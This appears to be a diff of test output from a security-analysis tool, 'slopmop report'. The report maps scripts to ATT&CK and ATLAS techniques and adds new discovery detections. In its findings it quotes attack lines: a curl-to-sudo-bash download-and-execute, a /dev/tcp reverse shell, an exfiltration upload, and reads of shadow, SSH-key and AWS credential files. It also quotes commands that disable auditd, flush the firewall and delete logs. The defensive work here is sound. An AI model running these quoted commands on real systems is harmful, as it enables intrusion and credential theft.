@@ -5,7 +5,7 @@ slopmop report   <folder>
 Summary
   files       14  7 scripts, 7 outputs
   indicators  15  4 Domain, 1 Email, 7 IPv4, 3 URL
-  activities  28
+  activities  34
   tactics     11
   targeted    5   Hostnames 1, IP addresses 4
   exposed     18  Passwords and secrets 3, Usernames 6, Email addresses 1, Devices 2, IP addresses 6
@@ -22,15 +22,26 @@ Tactics   (tactic, identifiers, files)
   [!] Collection           TA0009, AML.TA0009  20261022_092500_step06_stage.sh
   [!] Execution            TA0002, AML.TA0005  20261022_091500_step04_persist.sh, 20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py and 1 more
   [!] Stealth              TA0005, AML.TA0007  20261022_092000_step05_evade.sh
-  [i] Discovery            TA0007, AML.TA0008  20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh, 20261022_091000_step03_privesc.sh and 3 more
+  [i] Discovery            TA0007, AML.TA0008  20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh, 20261022_091000_step03_privesc.sh and 7 more
 
 Timeline   (a block for each intent, from the first of its files to be created until the last, or for each period of files that show the same tactics; a row is an ATT&CK technique, then its tactic and its ATLAS technique, or the tools of a tactic that no technique is named for)
   [x] Discovery, CredentialAccess                                   2026-10-22T09:00:00Z to 2026-10-22T09:05:40Z
       T1083      File and Directory Discovery                                    TA0007  Discovery
       T1007      System Service Discovery                                        TA0007  Discovery
+      T1018      Remote System Discovery                                         TA0007  Discovery
+      T1033      System Owner/User Discovery                                     TA0007  Discovery
+      T1087      Account Discovery                                               TA0007  Discovery
       T1087.001  Account Discovery: Local Account                                TA0007  Discovery
+      T1518.001  Software Discovery: Security Software Discovery                 TA0007  Discovery
+      T1069      Permission Groups Discovery                                     TA0007  Discovery
+      T1069.001  Permission Groups Discovery: Local Groups                       TA0007  Discovery
+      T1082      System Information Discovery                                    TA0007  Discovery
+      T1654      Log Enumeration                                                 TA0007  Discovery
+      T1518.002  Software Discovery: Backup Software Discovery                   TA0007  Discovery
+      T1016.001  System Network Configuration Discovery: Internet Connection Discovery    TA0007  Discovery
+      T1046      Network Service Discovery                                       TA0007  Discovery
       T1087.003  Account Discovery: Email Account                                TA0007  Discovery
-      tools      id, uname, find, kubectl                                        TA0007  Discovery
+      tools      kubectl                                                         TA0007  Discovery
       T1552.005  Unsecured Credentials: Cloud Instance Metadata API              TA0006  CredentialAccess       AML.T0055  Unsecured Credentials
       T1003.008  OS Credential Dumping: /etc/passwd and /etc/shadow              TA0006  CredentialAccess       AML.T0090  OS Credential Dumping
       T1552.004  Unsecured Credentials: Private Keys                             TA0006  CredentialAccess       AML.T0055  Unsecured Credentials
@@ -44,7 +55,8 @@ Timeline   (a block for each intent, from the first of its files to be created u
       T1548.001  Abuse Elevation Control Mechanism: Setuid and Setgid            TA0004  PrivilegeEscalation
       T1611      Escape to Host                                                  TA0004  PrivilegeEscalation    AML.T0105  Escape to Host
 
-  [x] Execution, PrivilegeEscalation, Persistence                   2026-10-22T09:15:00Z
+  [x] Discovery, Execution, PrivilegeEscalation, Persistence        2026-10-22T09:15:00Z
+      T1518.002  Software Discovery: Backup Software Discovery                   TA0007  Discovery
       T1053.003  Scheduled Task/Job: Cron                                        TA0002  Execution
                                                                                  TA0003  Persistence
       T1053.002  Scheduled Task/Job: At                                          TA0002  Execution
@@ -57,7 +69,8 @@ Timeline   (a block for each intent, from the first of its files to be created u
       T1098.004  Account Manipulation: SSH Authorized Keys                       TA0003  Persistence
       T1546.004  Event Triggered Execution: Unix Shell Configuration Modification    TA0003  Persistence            AML.T0142  Event Triggered Execution
 
-  [x] Stealth, DefenseImpairment                                    2026-10-22T09:20:00Z
+  [x] Discovery, Stealth, DefenseImpairment                         2026-10-22T09:20:00Z
+      T1518.002  Software Discovery: Backup Software Discovery                   TA0007  Discovery
       T1070.003  Indicator Removal: Clear Command History                        TA0005  Stealth                AML.T0138  Indicator Removal
       T1070.006  Indicator Removal: Timestomp                                    TA0005  Stealth                AML.T0138  Indicator Removal
       T1685.006  Disable or Modify Tools: Clear Linux or Mac System Logs         TA0112  DefenseImpairment
@@ -67,7 +80,16 @@ Timeline   (a block for each intent, from the first of its files to be created u
       T1686      Disable or Modify System Firewall                               TA0112  DefenseImpairment
 
   [x] Discovery, LateralMovement, Execution, Collection, CommandAndControl, Exfiltration  2026-10-22T09:25:00Z to 2026-10-22T09:30:00Z
-      tools      find, id, uname                                                 TA0007  Discovery
+      T1016.001  System Network Configuration Discovery: Internet Connection Discovery    TA0007  Discovery
+      T1046      Network Service Discovery                                       TA0007  Discovery
+      T1654      Log Enumeration                                                 TA0007  Discovery
+      T1083      File and Directory Discovery                                    TA0007  Discovery
+      T1518.002  Software Discovery: Backup Software Discovery                   TA0007  Discovery
+      T1033      System Owner/User Discovery                                     TA0007  Discovery
+      T1069      Permission Groups Discovery                                     TA0007  Discovery
+      T1069.001  Permission Groups Discovery: Local Groups                       TA0007  Discovery
+      T1087.001  Account Discovery: Local Account                                TA0007  Discovery
+      T1082      System Information Discovery                                    TA0007  Discovery
       T1021.004  Remote Services: SSH                                            TA0008  LateralMovement
       T1059.004  Command and Scripting Interpreter: Unix Shell                   TA0002  Execution              AML.T0050  Command and Scripting Interpreter
       T1059      Command and Scripting Interpreter                               TA0002  Execution              AML.T0050  Command and Scripting Interpreter
@@ -77,7 +99,8 @@ Timeline   (a block for each intent, from the first of its files to be created u
       T1048      Exfiltration Over Alternative Protocol                          TA0010  Exfiltration           AML.T0025  Exfiltration via Cyber Means
       tools      nc                                                              TA0010  Exfiltration
 
-  [x] Execution, Persistence, DefenseImpairment                     2026-10-22T09:35:00Z
+  [x] Discovery, Execution, Persistence, DefenseImpairment          2026-10-22T09:35:00Z
+      T1518.002  Software Discovery: Backup Software Discovery                   TA0007  Discovery
       T1053.003  Scheduled Task/Job: Cron                                        TA0002  Execution
                                                                                  TA0003  Persistence
       T1053.002  Scheduled Task/Job: At                                          TA0002  Execution
@@ -93,70 +116,85 @@ Timeline   (a block for each intent, from the first of its files to be created u
 
 Findings
   activities
-    [x] AccountCreation          2 lines  Persistence                       T1136.001, AML.T0125
+    [x] AccountCreation            2 lines  Persistence                       T1136.001, AML.T0125
         what  useradd -m -s /bin/bash svc (20261022_091500_step04_persist.sh:7)
               useradd -m -s /bin/bash svc (audit_20261022_093500.jsonl)
-    [x] CloudMetadataAccess      1 line   CredentialAccess                  T1552.005, AML.T0055
+    [x] CloudMetadataAccess        1 line   CredentialAccess                  T1552.005, AML.T0055
         what  curl -s http://169.254.169.254/latest/meta-data/ > meta_20261022_090040.txt (20261022_090000_step01_recon.sh:9)
-    [x] ClusterSecretRead        1 line   CredentialAccess                  T1552.007, AML.T0055
+    [x] ClusterSecretRead          1 line   CredentialAccess                  T1552.007, AML.T0055
         what  kubectl get secrets -A -o yaml (20261022_090500_step02_creds.sh:7)
-    [x] ContainerEscape          1 line   PrivilegeEscalation               T1611, AML.T0105
+    [x] ContainerEscape            1 line   PrivilegeEscalation               T1611, AML.T0105
         what  docker run -v /:/host alpine ls /host (20261022_091000_step03_privesc.sh:6)
-    [x] CredentialFileRead       1 line   CredentialAccess                  T1552.001, AML.T0055
+    [x] CredentialFileRead         1 line   CredentialAccess                  T1552.001, AML.T0055
         what  cat ~/.aws/credentials (20261022_090500_step02_creds.sh:3)
-    [x] FileUpload               1 line   Exfiltration                      T1048, AML.T0025
+    [x] FileUpload                 1 line   Exfiltration                      T1048, AML.T0025
         what  curl -T out.tgz https://files.example.net/up (20261022_092500_step06_stage.sh:8)
-    [x] FirewallDisabling        2 lines  DefenseImpairment                 T1686
+    [x] FirewallDisabling          2 lines  DefenseImpairment                 T1686
         what  iptables -F (20261022_092000_step05_evade.sh:5)
               iptables -F (audit_20261022_093500.jsonl)
-    [x] HistoryDisabling         1 line   DefenseImpairment                 T1690
+    [x] HistoryDisabling           1 line   DefenseImpairment                 T1690
         what  unset HISTFILE (20261022_092000_step05_evade.sh:3)
-    [x] LogDeletion              1 line   DefenseImpairment                 T1685.006
+    [x] LogDeletion                1 line   DefenseImpairment                 T1685.006
         what  rm -f /var/log/auth.log (20261022_092000_step05_evade.sh:6)
-    [x] PrivateKeyRead           1 line   CredentialAccess                  T1552.004, AML.T0055
+    [x] PrivateKeyRead             1 line   CredentialAccess                  T1552.004, AML.T0055
         what  cat ~/.ssh/id_rsa (20261022_090500_step02_creds.sh:4)
-    [x] ReverseShell             1 line   CommandAndControl, Execution      T1059.004, T1095, AML.T0050, AML.T0072
+    [x] ReverseShell               1 line   CommandAndControl, Execution      T1059.004, T1095, AML.T0050, AML.T0072
         what  os.system("exec 3<>/dev/tcp/$H/$PORT") (20261022_093000_step07_channel.py:8)
-    [x] ScheduledJobCreation     2 lines  Execution, Persistence            T1053.003, T1053.002, T1053.006
+    [x] ScheduledJobCreation       2 lines  Execution, Persistence            T1053.003, T1053.002, T1053.006
         what  (crontab -l; echo "$JOB") | crontab - (20261022_091500_step04_persist.sh:3)
               crontab - (audit_20261022_093500.jsonl)
-    [x] SecurityToolDisabling    2 lines  DefenseImpairment                 T1685, T1685.004
+    [x] SecurityToolDisabling      2 lines  DefenseImpairment                 T1685, T1685.004
         what  systemctl stop auditd (20261022_092000_step05_evade.sh:4)
               systemctl stop auditd (audit_20261022_093500.jsonl)
-    [x] SetuidBit                1 line   PrivilegeEscalation               T1548.001
+    [x] SetuidBit                  1 line   PrivilegeEscalation               T1548.001
         what  chmod u+s "$F" (20261022_091000_step03_privesc.sh:4)
-    [x] ShadowFileRead           1 line   CredentialAccess                  T1003.008, AML.T0090
+    [x] ShadowFileRead             1 line   CredentialAccess                  T1003.008, AML.T0090
         what  sudo cat /etc/shadow > shadow_20261022_090530.txt (20261022_090500_step02_creds.sh:6)
-    [x] ShellDownloadAndExecute  1 line   CommandAndControl, Execution      T1059.004, T1105, AML.T0050, AML.T0072
+    [x] ShellDownloadAndExecute    1 line   CommandAndControl, Execution      T1059.004, T1105, AML.T0050, AML.T0072
         what  sudo bash -c "$(curl -fsSL http://203.0.113.40/s.sh)" (20261022_092500_step06_stage.sh:4)
-    [x] ShellHistoryRead         1 line   CredentialAccess                  T1552.003, AML.T0055
+    [x] ShellHistoryRead           1 line   CredentialAccess                  T1552.003, AML.T0055
         what  grep -i token ~/.bash_history (20261022_090500_step02_creds.sh:5)
-    [x] ShellProfilePersistence  1 line   Persistence                       T1546.004, AML.T0142
+    [x] ShellProfilePersistence    1 line   Persistence                       T1546.004, AML.T0142
         what  echo "$LINE" >> ~/.bashrc (20261022_091500_step04_persist.sh:8)
-    [x] SshKeyPersistence        1 line   Persistence                       T1098.004
+    [x] SshKeyPersistence          1 line   Persistence                       T1098.004
         what  echo "$KEY" >> ~/.ssh/authorized_keys (20261022_091500_step04_persist.sh:4)
-    [x] SudoersModification      1 line   PrivilegeEscalation               T1548.003
+    [x] SudoersModification        1 line   PrivilegeEscalation               T1548.003
         what  echo "$RULE" >> /etc/sudoers.d/svc (20261022_091000_step03_privesc.sh:5)
-    [x] SystemdUnitCreation      2 lines  Persistence, PrivilegeEscalation  T1543.002
+    [x] SystemdUnitCreation        2 lines  Persistence, PrivilegeEscalation  T1543.002
         what  cp sync.service /etc/systemd/system/sync.service (20261022_091500_step04_persist.sh:5)
               systemctl enable --now sync.service (20261022_091500_step04_persist.sh:6)
-    [!] ArchiveCreation          2 lines  Collection                        T1560.001
+    [!] ArchiveCreation            2 lines  Collection                        T1560.001
         what  tar czf out.tgz dir/ (20261022_092500_step06_stage.sh:3)
               find /srv -name '*.bak' -exec gzip {} \; (20261022_092500_step06_stage.sh:7)
-    [!] HistoryClearing          1 line   Stealth                           T1070.003, AML.T0138
+    [!] HistoryClearing            1 line   Stealth                           T1070.003, AML.T0138
         what  history -c (20261022_092000_step05_evade.sh:7)
-    [!] Timestomp                1 line   Stealth                           T1070.006, AML.T0138
+    [!] Timestomp                  1 line   Stealth                           T1070.006, AML.T0138
         what  touch -r /bin/ls "$F" (20261022_092000_step05_evade.sh:8)
-    [i] EmailAccountDiscovery    1 line   Discovery                         T1087.003
+    [i] AccountEnumeration         2 lines  Discovery                         T1087
+        what  cat /etc/passwd | cut -d: -f1 (20261022_090000_step01_recon.sh:4)
+              cat /etc/passwd > passwd_20261022_090020.txt (20261022_090000_step01_recon.sh:5)
+    [i] EmailAccountDiscovery      1 line   Discovery                         T1087.003
         what  SMTP_USER=alerts@corp.example (env_20261022_090540.txt:4)
-    [i] LocalAccountDiscovery    4 lines  Discovery                         T1087.001
+    [i] LocalAccountDiscovery      4 lines  Discovery                         T1087.001
         what  root:x:0:0:root:/root:/bin/bash (passwd_20261022_090020.txt:1)
               daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin (passwd_20261022_090020.txt:2)
               deploy:x:1000:1000:Deploy:/home/deploy:/bin/bash (passwd_20261022_090020.txt:3)
               and 1 more in the saved findings
-    [i] ServiceDiscovery         1 line   Discovery                         T1007
+    [i] LocalAccountEnumeration    2 lines  Discovery                         T1087.001
+        what  cat /etc/passwd | cut -d: -f1 (20261022_090000_step01_recon.sh:4)
+              cat /etc/passwd > passwd_20261022_090020.txt (20261022_090000_step01_recon.sh:5)
+    [i] LoggedOnUserDiscovery      2 lines  Discovery                         T1033
+        what  cat /etc/passwd | cut -d: -f1 (20261022_090000_step01_recon.sh:4)
+              cat /etc/passwd > passwd_20261022_090020.txt (20261022_090000_step01_recon.sh:5)
+    [i] NetworkServiceDiscovery    1 line   Discovery                         T1046
+        what  subprocess.run(["sh", "-c", "nc -zv 203.0.113.41 443"]) (20261022_093000_step07_channel.py:7)
+    [i] RemoteSystemDiscovery      1 line   Discovery                         T1018
+        what  cat /etc/hosts > hosts_20261022_090025.txt (20261022_090000_step01_recon.sh:6)
+    [i] SecuritySoftwareDiscovery  1 line   Discovery                         T1518.001
         what  systemctl status sshd (20261022_090000_step01_recon.sh:7)
-    [i] SetuidFileSearch         1 line   Discovery                         T1083
+    [i] ServiceDiscovery           1 line   Discovery                         T1007
+        what  systemctl status sshd (20261022_090000_step01_recon.sh:7)
+    [i] SetuidFileSearch           1 line   Discovery                         T1083
         what  find / -perm -4000 -type f 2>/dev/null > suid_20261022_090030.txt (20261022_090000_step01_recon.sh:8)
 
 Targeted   (hardcoded values: prior means no earlier output holds it, discovered means one does; subjects: each entity an activity acted on)
@@ -188,7 +226,10 @@ Targeted   (hardcoded values: prior means no earlier output holds it, discovered
     [x] auditd  SecurityToolDisabling
         what  SecurityToolDisabling: systemctl stop auditd (20261022_092000_step05_evade.sh:4)
               SecurityToolDisabling: systemctl stop auditd (audit_20261022_093500.jsonl)
-  File (10)
+  File (11)
+    [i] /etc/passwd             LocalAccountEnumeration
+        what  LocalAccountEnumeration: cat /etc/passwd | cut -d: -f1 (20261022_090000_step01_recon.sh:4)
+              LocalAccountEnumeration: cat /etc/passwd > passwd_20261022_090020.txt (20261022_090000_step01_recon.sh:5)
     [x] /etc/shadow             ShadowFileRead
         what  ShadowFileRead: sudo cat /etc/shadow > shadow_20261022_090530.txt (20261022_090500_step02_creds.sh:6)
     [x] ~/.ssh/id_rsa           PrivateKeyRead
@@ -315,8 +356,9 @@ Impact
                username: daemon
                username: deploy
                username: root
+               username: ops
                email: alerts@corp.example
-      basis    SetuidFileSearch, ServiceDiscovery, Discovery tools, exposed username, exposed email, exposed device, exposed ip
+      basis    SetuidFileSearch, ServiceDiscovery, RemoteSystemDiscovery, LoggedOnUserDiscovery, NetworkServiceDiscovery, AccountEnumeration, LocalAccountEnumeration, SecuritySoftwareDiscovery, Discovery tools, exposed username, exposed email, exposed device, exposed ip
 
 Remediation   (most urgent first)
   [x] Revoke sessions and reset identities
@@ -357,16 +399,17 @@ Remediation   (most urgent first)
                username: daemon
                username: deploy
                username: root
+               username: ops
                email: alerts@corp.example
-      basis    SetuidFileSearch, ServiceDiscovery, Discovery tools, exposed username, exposed email, exposed device, exposed ip
+      basis    SetuidFileSearch, ServiceDiscovery, RemoteSystemDiscovery, LoggedOnUserDiscovery, NetworkServiceDiscovery, AccountEnumeration, LocalAccountEnumeration, SecuritySoftwareDiscovery, Discovery tools, exposed username, exposed email, exposed device, exposed ip
 
 Mitigation   (MITRE ATT&CK and ATLAS, for the techniques found)
   [x] M1017 User Training                                        T1552.001
       User Training involves educating employees and contractors on recognizing, reporting, and preventing cyber threats that rely on human interaction, such as phishing, social engineering, and other manipulative techniques.
       for      CredentialFileRead
-  [x] M1018 User Account Management                              T1021.004, T1048, T1053.002, T1053.003, T1053.006, T1098.004, T1543.002, T1552.007, T1685, T1685.004, T1686
+  [x] M1018 User Account Management                              T1021.004, T1048, T1053.002, T1053.003, T1053.006, T1087, T1098.004, T1543.002, T1552.007, T1654, T1685, T1685.004, T1686
       User Account Management involves implementing and enforcing policies for the lifecycle of user accounts, including creation, modification, and deactivation.
-      for      FileUpload, ScheduledJobCreation, SshKeyPersistence, SystemdUnitCreation, ClusterSecretRead, SecurityToolDisabling, FirewallDisabling
+      for      FileUpload, ScheduledJobCreation, AccountEnumeration, SshKeyPersistence, SystemdUnitCreation, ClusterSecretRead, SecurityToolDisabling, FirewallDisabling
   [x] M1022 Restrict File and Directory Permissions              T1048, T1053.006, T1070.003, T1098.004, T1543.002, T1546.004, T1548.003, T1552.001, T1552.004, T1685, T1685.006, T1686
       Restricting file and directory permissions involves setting access controls at the file system level to limit which users, groups, or processes can read, write, or execute files.
       for      FileUpload, ScheduledJobCreation, HistoryClearing, SshKeyPersistence, SystemdUnitCreation, ShellProfilePersistence, SudoersModification, CredentialFileRead, PrivateKeyRead, SecurityToolDisabling, LogDeletion, FirewallDisabling
@@ -380,22 +423,22 @@ Mitigation   (MITRE ATT&CK and ATLAS, for the techniques found)
   [x] M1027 Password Policies                                    T1003.008, T1552.001, T1552.004
       Set and enforce secure password policies for accounts to reduce the likelihood of unauthorized access.
       for      ShadowFileRead, CredentialFileRead, PrivateKeyRead
-  [x] M1028 Operating System Configuration                       T1053.002, T1087.001, T1548.001, T1548.003, T1552.003, T1690
+  [x] M1028 Operating System Configuration                       T1053.002, T1087, T1087.001, T1548.001, T1548.003, T1552.003, T1690
       Operating System Configuration involves adjusting system settings and hardening the default configurations of an operating system (OS) to mitigate adversary exploitation and prevent abuse of system functionality.
       exposed  username: app_rw
                username: daemon
                username: deploy
                username: root
-      for      ScheduledJobCreation, LocalAccountDiscovery, SetuidBit, SudoersModification, ShellHistoryRead, HistoryDisabling
+      for      ScheduledJobCreation, AccountEnumeration, LocalAccountEnumeration, LocalAccountDiscovery, SetuidBit, SudoersModification, ShellHistoryRead, HistoryDisabling
   [x] M1029 Remote Data Storage                                  T1070.003, T1685.006
       Remote Data Storage focuses on moving critical data, such as security logs and sensitive files, to secure, off-host locations to minimize unauthorized access, tampering, or destruction by adversaries.
       for      HistoryClearing, LogDeletion
-  [x] M1030 Network Segmentation                                 T1048, T1095, T1552.007
+  [x] M1030 Network Segmentation                                 T1046, T1048, T1095, T1552.007
       Network segmentation involves dividing a network into smaller, isolated segments to control and limit the flow of traffic between devices, systems, and applications.
-      for      FileUpload, ReverseShell, ClusterSecretRead
-  [x] M1031 Network Intrusion Prevention                         T1048, T1095, T1105
+      for      NetworkServiceDiscovery, FileUpload, ReverseShell, ClusterSecretRead
+  [x] M1031 Network Intrusion Prevention                         T1046, T1048, T1095, T1105
       Use intrusion detection signatures to block traffic at network boundaries.
-      for      FileUpload, ReverseShell, ShellDownloadAndExecute
+      for      NetworkServiceDiscovery, FileUpload, ReverseShell, ShellDownloadAndExecute
   [x] M1032 Multi-factor Authentication                          T1021.004, T1136.001
       Multi-Factor Authentication (MFA) enhances security by requiring users to provide at least two forms of verification to prove their identity before granting access.
       exposed  username: svc
@@ -418,9 +461,9 @@ Mitigation   (MITRE ATT&CK and ATLAS, for the techniques found)
   [x] M1041 Encrypt Sensitive Information                        T1552.004, T1685.006
       Protect sensitive information at rest, in transit, and during processing by using strong encryption algorithms.
       for      PrivateKeyRead, LogDeletion
-  [x] M1042 Disable or Remove Feature or Program                 T1021.004, T1059, T1098.004, T1552.005, T1611, T1685
+  [x] M1042 Disable or Remove Feature or Program                 T1021.004, T1046, T1059, T1098.004, T1552.005, T1611, T1685
       Disable or remove unnecessary and potentially vulnerable software, features, or services to reduce the attack surface and prevent abuse by adversaries.
-      for      SshKeyPersistence, CloudMetadataAccess, ContainerEscape, SecurityToolDisabling
+      for      NetworkServiceDiscovery, SshKeyPersistence, CloudMetadataAccess, ContainerEscape, SecurityToolDisabling
   [x] M1047 Audit                                                T1053.002, T1053.003, T1059, T1095, T1552.001, T1552.004, T1560.001, T1685, T1685.004, T1686
       Auditing is the process of recording activity and systematically reviewing and analyzing the activity and system configurations.
       for      ScheduledJobCreation, ReverseShell, CredentialFileRead, PrivateKeyRead, ArchiveCreation, SecurityToolDisabling, FirewallDisabling
